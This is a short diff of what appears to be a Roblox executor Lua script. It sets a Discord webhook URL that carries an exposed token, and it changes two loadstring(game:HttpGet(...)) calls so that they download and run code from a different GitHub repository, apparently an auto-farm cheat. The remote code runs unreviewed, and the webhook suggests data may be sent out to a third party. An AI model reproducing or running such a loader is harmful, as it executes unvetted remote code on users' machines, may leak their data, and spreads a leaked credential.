@@ -6,9 +6,9 @@ _G.webhook = "https://discord.com/api/webhooks/1434627199444451561/X6JjcoEi7Df_x
 
 -- Run both scripts concurrently
 spawn(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/1DeathStare1/Strike.Hub/refs/heads/main/Strike.lua"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/P076main/AUTO-FARM-V2/refs/heads/main/test2.lua"))()
 end)
 
 spawn(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/1DeathStare1/Strike.Hub/refs/heads/main/Gui.lua"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/P076main/AUTO-FARM-V2/refs/heads/main/Gui.lua"))()
 end)
